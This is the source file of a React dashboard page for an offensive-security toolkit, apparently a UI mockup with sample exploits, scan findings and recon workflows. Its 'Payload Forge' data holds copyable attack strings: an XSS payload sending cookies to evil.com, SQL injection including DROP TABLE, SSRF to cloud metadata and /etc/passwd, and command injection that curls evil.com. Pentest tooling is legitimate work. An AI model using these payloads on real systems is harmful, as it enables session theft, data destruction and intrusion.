import { useState } from "react";
import { Swords, Shield, Bug, Terminal, Zap, ChevronDown, Play, Copy, Check, GitBranch, Pause, Plus, Clock, AlertTriangle, Sparkles, TrendingUp, Activity } from "lucide-react";
import AppLayout from "@/components/AppLayout";
import { motion, AnimatePresence } from "framer-motion";
import { useToast } from "@/hooks/use-toast";

type Section = "exploit" | "scanner" | "automation" | "payloads";

const exploits = [
  { name: "CVE-2024-3094 (xz backdoor)", target: "ssh services", language: "Bash", status: "ready", risk: "critical" },
  { name: "Log4Shell (CVE-2021-44228)", target: "java apps", language: "Python", status: "ready", risk: "critical" },
  { name: "Spring4Shell (CVE-2022-22965)", target: "spring framework", language: "Python", status: "draft", risk: "high" },
  { name: "ProxyShell chain", target: "exchange servers", language: "Python", status: "ready", risk: "critical" },
  { name: "JWT none-alg bypass", target: "auth endpoints", language: "JS", status: "ready", risk: "high" },
  { name: "SSRF → metadata exfil", target: "cloud apps", language: "Python", status: "draft", risk: "high" },
];

const findings = [
  { id: "VULN-001", title: "SQL Injection in /api/search", severity: "critical", cvss: 9.8, host: "api.target.com", status: "open" },
  { id: "VULN-002", title: "Reflected XSS in error page", severity: "high", cvss: 7.4, host: "admin.target.com", status: "open" },
  { id: "VULN-003", title: "Outdated jQuery 1.8 (CVE-2020-11023)", severity: "medium", cvss: 6.1, host: "target.com", status: "open" },
  { id: "VULN-004", title: "Missing HSTS header", severity: "low", cvss: 3.1, host: "cdn.target.com", status: "triaged" },
  { id: "VULN-005", title: "S3 bucket directory listing", severity: "high", cvss: 7.5, host: "files.target.com", status: "open" },
  { id: "VULN-006", title: "GraphQL introspection enabled", severity: "medium", cvss: 5.3, host: "api.target.com", status: "open" },
];

const flows = [
  { name: "Daily Recon Sweep", trigger: "Cron: 06:00 UTC", steps: ["amass enum", "subfinder", "httpx probe", "nuclei tags:exposure"], enabled: true, lastRun: "2h ago" },
  { name: "New Subdomain → Scan", trigger: "On: subdomain discovered", steps: ["httpx", "katana crawl", "nuclei full"], enabled: true, lastRun: "23m ago" },
  { name: "JS Endpoint Harvest", trigger: "Cron: hourly", steps: ["fetch JS", "extract endpoints", "diff vs known"], enabled: true, lastRun: "11m ago" },
  { name: "S3 Bucket Hunter", trigger: "Manual", steps: ["permutate names", "check public", "report findings"], enabled: false, lastRun: "3d ago" },
];

const payloadCats = [
  { name: "XSS", payloads: [`<script>fetch('//evil.com?c='+document.cookie)</script>`, `<img src=x onerror=alert(1)>`, `"><svg/onload=confirm(1)>`, `javascript:eval(atob('YWxlcnQoMSk='))`] },
  { name: "SQLi", payloads: [`' OR '1'='1`, `' UNION SELECT NULL,version(),NULL--`, `'; DROP TABLE users;--`, `' OR SLEEP(5)--`] },
  { name: "SSRF", payloads: [`http://169.254.169.254/latest/meta-data/`, `http://localhost:6379/`, `gopher://127.0.0.1:25/_HELO`, `file:///etc/passwd`] },
  { name: "CMD Injection", payloads: [`; cat /etc/passwd`, `| whoami`, `\`id\``, `$(curl evil.com/$(hostname))`] },
];

const sevColor: Record<string, string> = {
  critical: "text-destructive border-destructive/40 bg-destructive/10",
  high: "text-primary border-primary/40 bg-primary/10",
  medium: "text-primary/70 border-primary/20 bg-primary/5",
  low: "text-muted-foreground border-border bg-surface-2",
};

export default function OffensiveOps() {
  const [open, setOpen] = useState<Section | null>("exploit");
  const toggle = (s: Section) => setOpen(open === s ? null : s);

  const sections = [
    {
      key: "exploit" as const, title: "EXPLOIT LAB", subtitle: "Develop, test, and detonate proof-of-concept exploits", icon: Shield,
      metrics: [
        { label: "Ready", value: exploits.filter(e => e.status === "ready").length },
        { label: "Critical", value: exploits.filter(e => e.risk === "critical").length },
        { label: "Languages", value: new Set(exploits.map(e => e.language)).size },
      ],
    },
    {
      key: "scanner" as const, title: "VULN SCANNER", subtitle: "Automated vulnerability discovery & triage", icon: Bug,
      metrics: [
        { label: "Open", value: findings.filter(f => f.status === "open").length },
        { label: "Critical", value: findings.filter(f => f.severity === "critical").length },
        { label: "Avg CVSS", value: (findings.reduce((a, f) => a + f.cvss, 0) / findings.length).toFixed(1) },
      ],
    },
    {
      key: "automation" as const, title: "AUTOMATION", subtitle: "Always-on workflows and scheduled hunts", icon: Zap,
      metrics: [
        { label: "Active", value: flows.filter(f => f.enabled).length },
        { label: "Total", value: flows.length },
        { label: "Last Run", value: "11m" },
      ],
    },
    {
      key: "payloads" as const, title: "PAYLOAD FORGE", subtitle: "Crafted payloads ready to deploy", icon: Terminal,
      metrics: [
        { label: "Categories", value: payloadCats.length },
        { label: "Payloads", value: payloadCats.reduce((a, c) => a + c.payloads.length, 0) },
        { label: "One-click", value: "✓" },
      ],
    },
  ];

  return (
    <AppLayout title="OFFENSIVE OPS" subtitle="Unified offensive toolkit — exploits, scans, automations, payloads" icon={Swords}>
      <div className="p-5 space-y-3 max-w-6xl">
        {sections.map(s => {
          const isOpen = open === s.key;
          const Icon = s.icon;
          return (
            <div key={s.key} className={`bg-surface-1 border rounded-lg overflow-hidden transition-all ${isOpen ? "border-primary shadow-glow" : "border-border hover:border-primary/40"}`}>
              <button onClick={() => toggle(s.key)} className="w-full px-5 py-4 flex items-center justify-between gap-4 text-left">
                <div className="flex items-center gap-3 min-w-0">
                  <div className={`w-10 h-10 rounded-md flex items-center justify-center shrink-0 ${isOpen ? "bg-primary/20 neon-gold-box" : "bg-primary/10"}`}>
                    <Icon className="w-5 h-5 text-primary" />
                  </div>
                  <div className="min-w-0">
                    <div className="font-mono text-sm font-bold text-foreground tracking-wider">{s.title}</div>
                    <div className="text-[10px] font-mono text-muted-foreground truncate">{s.subtitle}</div>
                  </div>
                </div>
                <div className="flex items-center gap-2 shrink-0">
                  {s.metrics.map(m => (
                    <div key={m.label} className="hidden sm:flex flex-col items-center px-3 py-1 rounded bg-surface-2 border border-border">
                      <span className="text-[9px] font-mono text-muted-foreground uppercase">{m.label}</span>
                      <span className="text-xs font-mono font-bold text-primary">{m.value}</span>
                    </div>
                  ))}
                  <ChevronDown className={`w-4 h-4 text-primary transition-transform ${isOpen ? "rotate-180" : ""}`} />
                </div>
              </button>
              <AnimatePresence initial={false}>
                {isOpen && (
                  <motion.div
                    initial={{ height: 0, opacity: 0 }}
                    animate={{ height: "auto", opacity: 1 }}
                    exit={{ height: 0, opacity: 0 }}
                    transition={{ duration: 0.2 }}
                    className="overflow-hidden border-t border-border"
                  >
                    <div className="p-5">
                      {s.key === "exploit" && <ExploitPanel />}
                      {s.key === "scanner" && <ScannerPanel />}
                      {s.key === "automation" && <AutomationPanel />}
                      {s.key === "payloads" && <PayloadPanel />}
                      <InnovationStrip section={s.key} />
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          );
        })}
      </div>
    </AppLayout>
  );
}

function ExploitPanel() {
  return (
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
      {exploits.map(e => (
        <div key={e.name} className="bg-surface-2 border border-border rounded-lg p-3 hover:border-primary/40 transition-all">
          <div className="flex items-start justify-between mb-2">
            <GitBranch className="w-4 h-4 text-primary" />
            <span className={`text-[9px] font-mono font-bold px-2 py-0.5 rounded border ${sevColor[e.risk]}`}>{e.risk.toUpperCase()}</span>
          </div>
          <h3 className="font-mono text-xs font-bold text-foreground mb-1">{e.name}</h3>
          <p className="text-[10px] font-mono text-muted-foreground mb-3">→ {e.target}</p>
          <div className="flex items-center justify-between pt-2 border-t border-border">
            <span className="text-[10px] font-mono text-muted-foreground">{e.language} · {e.status}</span>
            <button className="flex items-center gap-1 px-2 py-1 rounded bg-primary/10 text-primary text-[10px] font-mono font-bold hover:bg-primary/20">
              <Play className="w-3 h-3" /> RUN
            </button>
          </div>
        </div>
      ))}
    </div>
  );
}

function ScannerPanel() {
  return (
    <div className="space-y-3">
      <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
        {[
          { label: "Critical", value: findings.filter(f => f.severity === "critical").length, icon: AlertTriangle },
          { label: "High", value: findings.filter(f => f.severity === "high").length, icon: Bug },
          { label: "Medium", value: findings.filter(f => f.severity === "medium").length, icon: Bug },
          { label: "Resolved", value: 12, icon: Activity },
        ].map(({ label, value, icon: I }) => (
          <div key={label} className="bg-surface-2 border border-border rounded p-3">
            <div className="flex items-center justify-between mb-1">
              <span className="text-[9px] font-mono text-muted-foreground uppercase">{label}</span>
              <I className="w-3 h-3 text-primary" />
            </div>
            <div className="text-xl font-mono font-bold text-foreground">{value}</div>
          </div>
        ))}
      </div>
      <div className="divide-y divide-border border border-border rounded">
        {findings.map(f => (
          <div key={f.id} className="px-3 py-2 hover:bg-surface-2 flex items-center gap-3">
            <span className="font-mono text-[10px] text-muted-foreground w-20">{f.id}</span>
            <div className={`px-2 py-0.5 rounded border text-[9px] font-mono font-bold uppercase ${sevColor[f.severity]}`}>{f.severity}</div>
            <div className="flex-1 min-w-0">
              <div className="font-mono text-xs text-foreground truncate">{f.title}</div>
              <div className="text-[10px] font-mono text-muted-foreground">{f.host} · CVSS {f.cvss}</div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function AutomationPanel() {
  const [items, setItems] = useState(flows);
  return (
    <div className="space-y-2">
      {items.map((f, i) => (
        <div key={f.name} className="bg-surface-2 border border-border rounded p-3">
          <div className="flex items-start justify-between mb-2">
            <div className="flex items-center gap-2">
              <Zap className={`w-4 h-4 ${f.enabled ? "text-primary" : "text-muted-foreground"}`} />
              <div>
                <h3 className="font-mono text-xs font-bold text-foreground">{f.name}</h3>
                <p className="text-[10px] font-mono text-muted-foreground">{f.trigger}</p>
              </div>
            </div>
            <button
              onClick={() => setItems(prev => prev.map((x, idx) => idx === i ? { ...x, enabled: !x.enabled } : x))}
              className={`p-1.5 rounded ${f.enabled ? "bg-primary/10 text-primary" : "bg-surface-1 text-muted-foreground"}`}
            >
              {f.enabled ? <Pause className="w-3 h-3" /> : <Play className="w-3 h-3" />}
            </button>
          </div>
          <div className="flex flex-wrap gap-1 pt-2 border-t border-border">
            {f.steps.map((s, idx) => (
              <span key={idx} className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-surface-1 text-muted-foreground border border-border">{idx + 1}. {s}</span>
            ))}
          </div>
        </div>
      ))}
      <button className="w-full flex items-center justify-center gap-2 py-2 rounded border border-dashed border-primary/40 text-primary text-xs font-mono hover:bg-primary/5">
        <Plus className="w-3 h-3" /> New Workflow
      </button>
    </div>
  );
}

function PayloadPanel() {
  const [copied, setCopied] = useState<string | null>(null);
  const { toast } = useToast();
  const copy = (p: string) => {
    navigator.clipboard.writeText(p);
    setCopied(p);
    toast({ title: "Copied", description: "Payload in clipboard" });
    setTimeout(() => setCopied(null), 1500);
  };
  return (
    <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
      {payloadCats.map(cat => (
        <div key={cat.name} className="bg-surface-2 border border-border rounded overflow-hidden">
          <div className="px-3 py-2 border-b border-border flex items-center justify-between">
            <h3 className="text-xs font-mono font-bold text-primary">{cat.name}</h3>
            <span className="text-[10px] font-mono text-muted-foreground">{cat.payloads.length}</span>
          </div>
          <div className="divide-y divide-border">
            {cat.payloads.map(p => (
              <div key={p} className="px-3 py-2 flex items-center gap-2 group hover:bg-surface-1">
                <code className="flex-1 text-[10px] font-mono text-foreground break-all">{p}</code>
                <button onClick={() => copy(p)} className="opacity-0 group-hover:opacity-100 p-1 rounded text-primary">
                  {copied === p ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                </button>
              </div>
            ))}
          </div>
        </div>
      ))}
    </div>
  );
}

function InnovationStrip({ section }: { section: Section }) {
  const ideas: Record<Section, string[]> = {
    exploit: ["Auto-chain PoCs by CVE family", "Spin up isolated sandbox per detonation", "Generate Frida hook from exploit metadata"],
    scanner: ["Diff findings against previous scan", "Auto-create reports for criticals", "Correlate CVSS with bounty payouts"],
    automation: ["Trigger workflows from new findings", "Slack/Discord webhook on completion", "ML-suggested next pipeline step"],
    payloads: ["Send payload directly to Exploit Lab", "Mutate via AI for WAF bypass", "Track payload success rate per target"],
  };
  return (
    <div className="mt-4 p-3 rounded border border-primary/20 bg-primary/5">
      <div className="flex items-center gap-2 mb-2">
        <Sparkles className="w-3 h-3 text-primary" />
        <span className="text-[10px] font-mono font-bold text-primary uppercase tracking-widest">Future Innovations</span>
      </div>
      <div className="flex flex-wrap gap-2">
        {ideas[section].map(i => (
          <span key={i} className="text-[10px] font-mono px-2 py-1 rounded bg-surface-2 border border-border text-foreground">
            <TrendingUp className="w-2.5 h-2.5 text-primary inline mr-1" />{i}
          </span>
        ))}
      </div>
    </div>
  );
}
